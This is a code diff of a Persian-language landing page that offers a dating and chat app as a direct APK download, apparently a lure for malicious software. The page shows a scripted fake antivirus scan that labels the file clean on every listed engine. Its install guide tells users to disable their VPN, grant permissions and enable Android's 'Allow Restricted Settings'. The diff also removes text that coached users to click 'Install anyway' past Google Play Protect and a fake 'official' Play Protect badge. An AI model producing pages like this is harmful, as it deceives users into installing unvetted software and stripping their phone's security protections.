@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دوست یابی و چت تصویری | دانلود برنامه</title>
+    <title>دوست یابی و چت | دانلود برنامه</title>
     <link href="https://cdn.jsdelivr.net/npm/vazirmatn@v33.0.3/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
     <style>
         * {
@@ -151,7 +151,7 @@
             font-size: 16px;
             font-weight: bold;
             margin-bottom: 14px;
-            box-shadow: 0 4px 20px rgba(11, 87, 208, 0.6); 
+            box-shadow: 0 4px 20px rgba(11, 87, 208, 0.6); /* ارتقای افکت درخشندگی */
             transition: background 0.2s, transform 0.2s;
             cursor: pointer;
             border: none;
@@ -174,13 +174,13 @@
 
         /* بخش آنتی ویروس با استایل شیشه‌ای (Glassmorphism) سبک مدرن iOS */
         .antivirus-section {
-            background: rgba(18, 24, 31, 0.7); 
-            backdrop-filter: blur(12px); 
+            background: rgba(18, 24, 31, 0.7); /* پس‌زمینه شیشه‌ای نیمه شفاف */
+            backdrop-filter: blur(12px); /* افکت بلور پس‌زمینه اپل استایل */
             -webkit-backdrop-filter: blur(12px);
             border-radius: 12px;
             padding: 12px;
             margin-bottom: 14px;
-            border: 1px solid rgba(66, 165, 245, 0.2); 
+            border: 1px solid rgba(66, 165, 245, 0.2); /* بوردر ظریف هماهنگ با تم */
         }
         .av-toggle-btn {
             display: flex;
@@ -219,7 +219,7 @@
             padding-bottom: 8px;
         }
         
-        /* دکمه اختصاصی کادر راهنمای نصب */
+        /* دکمه اختصاصی کادر راهنمای نصب - اصلاح شده، کوچک و منظم */
         .guide-trigger-btn {
             background: rgba(255, 152, 0, 0.12);
             color: #ffb74d;
@@ -277,7 +277,6 @@
             height: 15px;
         }
         .status-clean { color: #00e676; font-weight: bold; }
-        .status-verified { color: #00ea90; font-weight: bold; text-shadow: 0 0 8px rgba(0, 234, 144, 0.3); }
         
         /* انیمیشن چرخش ۳۶۰ درجه برای آیکون وضعیت در حال اسکن */
         .status-scanning { color: #ffd54f; font-weight: bold; }
@@ -286,7 +285,7 @@
         }
         @keyframes spinIcon {
             0% { transform: rotate(0deg); }
-            100% { transform: rotate(-360deg); } 
+            100% { transform: rotate(-360deg); } /* چرخش معکوس متناسب با راست‌چین */
         }
 
         /* پاپ‌آپ راهنمای نصب شیک مدرن */
@@ -313,7 +312,7 @@
         .guide-modal {
             background: #1a2332;
             border: 1px solid #3d4f66;
-            max-width: 410px;
+            max-width: 400px;
             width: 100%;
             border-radius: 20px;
             padding: 20px;
@@ -321,8 +320,6 @@
             transform: scale(0.8);
             transition: transform 0.3s ease;
             position: relative;
-            max-height: 90vh;
-            overflow-y: auto;
         }
         .guide-modal-overlay.show .guide-modal {
             transform: scale(1);
@@ -384,7 +381,6 @@
             color: #e0e0e0;
             text-align: justify;
             line-height: 1.6;
-            width: 100%;
         }
         .step-highlight {
             color: #42a5f5;
@@ -417,25 +413,16 @@
             margin-bottom: 8px;
             box-shadow: 0 4px 10px rgba(255, 152, 0, 0.3);
         }
+        .info-icon-svg {
+            width: 16px;
+            height: 16px;
+            fill: #12181f;
+        }
         .android-instruction {
             font-size: 11px;
             color: #ffb74d;
             text-align: center;
             line-height: 1.5;
-        }
-
-        /* بخش کادر امنیتی هشدار کروم/گوگل پروتکت */
-        .protect-warning-box {
-            margin-top: 8px;
-            background: rgba(255, 152, 0, 0.05);
-            border: 1px dashed rgba(255, 152, 0, 0.4);
-            border-radius: 10px;
-            padding: 10px;
-        }
-        .protect-instruction {
-            font-size: 11px;
-            color: #e0e0e0;
-            line-height: 1.6;
         }
 
         /* اسکرین‌شات‌ها */
@@ -622,7 +609,7 @@
                 <img src="logo.png" alt="آیکون برنامه">
             </div>
             <div class="app-title">
-                <h2>دوست یابی</h2>
+                <h2>دوست یابی   </h2>
                 <p>نسخه اندروید (apk)</p>
             </div>
         </div>
@@ -660,7 +647,7 @@
             </div>
         </div>
 
-        <a href="dost-aligned.apk" class="install-btn">
+        <a href="dostyab.apk" class="install-btn">
             <svg class="btn-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
             دانلود و نصب مستقیم
         </a>
@@ -674,7 +661,9 @@
                 <span class="arrow">▼</span>
             </button>
             <div class="av-meta-info">
-                <button class="guide-trigger-btn" id="openGuideBtn" style="display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 4px 10px; vertical-align: middle;"><svg class="trigger-icon-svg" viewBox="0 0 24 24" fill="none" style="width: 14px; height: 14px; display: inline-block; filter: drop-shadow(0 0 3px rgba(255, 165, 0, 0.5));"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" fill="#FFA500" stroke="#FFA500" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><line x1="12" y1="9" x2="12" y2="13" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round"></line><circle cx="12" cy="17" r="1.2" fill="#FFFFFF"></circle></svg><span style="line-height: 1;">راهنمای نصب</span></button>
+            <button class="guide-trigger-btn" id="openGuideBtn" style="display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 4px 10px; vertical-align: middle;"><svg class="trigger-icon-svg" viewBox="0 0 24 24" fill="none" style="width: 14px; height: 14px; display: inline-block; filter: drop-shadow(0 0 3px rgba(255, 165, 0, 0.5));"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" fill="#FFA500" stroke="#FFA500" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><line x1="12" y1="9" x2="12" y2="13" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round"></line><circle cx="12" cy="17" r="1.2" fill="#FFFFFF"></circle></svg><span style="line-height: 1;">راهنمای نصب</span></button>
+
+                </button>
                 <span style="user-select: none;">تاریخ بررسی: <span id="avScanDate">کلیک کنید</span></span>
             </div>
             <div class="av-content" id="avContent">
@@ -766,39 +755,27 @@
             <div class="guide-step-item">
                 <div class="step-number">۱</div>
                 <div class="step-text">برای اتصال صحیح و سرعت حداکثری،<br>لطفاً <span class="step-highlight">بدون فیلترشکن</span> وارد برنامه شوید</div>
+
             </div>
             <div class="guide-step-item">
                 <div class="step-number">۲</div>
                <div class="step-text">برنامه جهت لود کامل <span class="step-highlight">۳ دسترسی اولیه</span>،<br>از شما درخواست می‌کند که باید آنها را تایید کنید</div>
+
             </div>
             <div class="guide-step-item">
                 <div class="step-number">۳</div>
                 <div class="step-text">
-                  <span class="step-highlight">مخصوص اندروید ۱۵ و ۱۶:</span><br>به دلیل قوانین جدید اندروید،<br>باید گزینه تنظیمات محدود شده فعال باشد
+                  <div class="step-text"><span class="step-highlight">مخصوص اندروید ۱۵ و ۱۶:</span><br>به دلیل قوانین جدید اندروید،<br>باید گزینه تنظیمات محدود شده فعال باشد</div>
+
                     <div class="android-action-box">
                         <div class="android-btn-link">
                           <span style="font-size: 13px; white-space: nowrap; display: inline-block;">راهنما فعال سازی تنظیمات محدود شده</span>
+
                         </div>
                         <div class="android-instruction">
                             دست خود را روی آیکون اپلیکیشن نگه داشته، روی علامت <b>(i) یا App Info</b> بزنید؛ سپس از منوی سه نقطه بالا سمت راست، گزینه <b>Allow Restricted Settings</b> (اجازه دادن به تنظیمات محدود شده) را فعال کنید.
                         </div>
                     </div>
-                </div>
-            </div>
-            <div class="guide-step-item">
-                <div class="step-number">۴</div>
-                <div class="step-text">
-                    <span class="step-highlight">پیام سپر ایمنی گوگل (Play Protect):</span><br>به دلیل اینکه برنامه مستقیماً از سایت دانلود می‌شود، سیستم امنیتی گوگل ممکن است به صورت پیش‌فرض پیام هشدار نشان دهد. این برنامه <b>کاملاً امن و تایید شده</b> است.
-                    
-                    <div class="android-action-box" style="margin-top: 8px; background: #12181f; border: 1px solid #ff9800; border-radius: 10px; padding: 12px; box-shadow: 0 4px 10px rgba(255, 152, 0, 0.15);">
-                        <div class="android-btn-link" style="display: flex; align-items: center; justify-content: center; gap: 6px; width: 100%; background: linear-gradient(135deg, #ff9800, #f57c00); color: #12181f; border: none; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: bold; cursor: default; font-family: inherit; margin-bottom: 8px; box-shadow: 0 4px 10px rgba(255, 152, 0, 0.3);">
-                          <span style="font-size: 13px; white-space: nowrap; display: inline-block;">راهنما عبور از خطای سپر ایمنی گوگل</span>
-                        </div>
-                        <div class="android-instruction" style="font-size: 11px; color: #ffb74d; text-align: center; line-height: 1.5;">
-                            هنگام مواجه شدن با هشدار گوگل، کافیست ابتدا روی گزینه <b>جزئیات بیشتر (More details)</b> و سپس روی دکمه <b>نصب در هر صورت (Install anyway)</b> بزنید تا برنامه به راحتی نصب شود.
-                        </div>
-                    </div>
-                    
                 </div>
             </div>
         </div>
@@ -827,27 +804,15 @@
     function initAntivirusList() {
         avListContainer.innerHTML = '';
         antivirusList.forEach((name, index) => {
-            if (name === "GooglePlayProtect") {
-                avListContainer.innerHTML += `
-                    <div class="av-item">
-                        <span class="av-name">${name}</span>
-                        <span class="av-status status-verified" id="av-status-${index}">
-                            ${cleanSvg}
-                            <span>تایید شده (رسمی)</span>
-                        </span>
-                    </div>
-                `;
-            } else {
-                avListContainer.innerHTML += `
-                    <div class="av-item">
-                        <span class="av-name">${name}</span>
-                        <span class="av-status status-clean" id="av-status-${index}">
-                            ${cleanSvg}
-                            <span>سالم</span>
-                        </span>
-                    </div>
-                `;
-            }
+            avListContainer.innerHTML += `
+                <div class="av-item">
+                    <span class="av-name">${name}</span>
+                    <span class="av-status status-clean" id="av-status-${index}">
+                        ${cleanSvg}
+                        <span>سالم</span>
+                    </span>
+                </div>
+            `;
         });
     }
     initAntivirusList();
@@ -880,15 +845,9 @@
 
             setTimeout(() => {
                 const statusEl = document.getElementById(`av-status-${listIndex}`);
-                const name = antivirusList[listIndex];
                 if (statusEl) {
-                    if (name === "GooglePlayProtect") {
-                        statusEl.className = "av-status status-verified";
-                        statusEl.innerHTML = `${cleanSvg}<span>تایید شده (رسمی)</span>`;
-                    } else {
-                        statusEl.className = "av-status status-clean";
-                        statusEl.innerHTML = `${cleanSvg}<span>سالم</span>`;
-                    }
+                    statusEl.className = "av-status status-clean";
+                    statusEl.innerHTML = `${cleanSvg}<span>سالم</span>`;
                 }
                 
                 if (sequenceOrder === indices.length - 1) {
